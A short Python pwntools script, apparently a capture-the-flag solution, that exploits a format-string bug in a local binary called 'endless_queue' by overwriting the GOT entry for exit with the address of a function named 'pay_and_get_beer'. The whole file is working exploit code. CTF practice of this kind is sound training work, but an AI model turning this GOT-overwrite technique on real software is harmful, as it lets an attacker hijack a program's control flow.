from pwn import *

context.binary = './endless_queue'
exe = ELF('./endless_queue')

io = process(level='debug')
#gdb.attach(io, api=True)

io.recvuntil(b'> ')
io.sendline(b'n')
io.recvuntil(b'> ')
#payload = p64(exe.got['exit']) + b'aaaaaaaa' + b'%8$n'
payload = fmtstr_payload(8,{exe.got['exit']: exe.sym['pay_and_get_beer']})
print(payload)
io.sendline(payload)

io.interactive()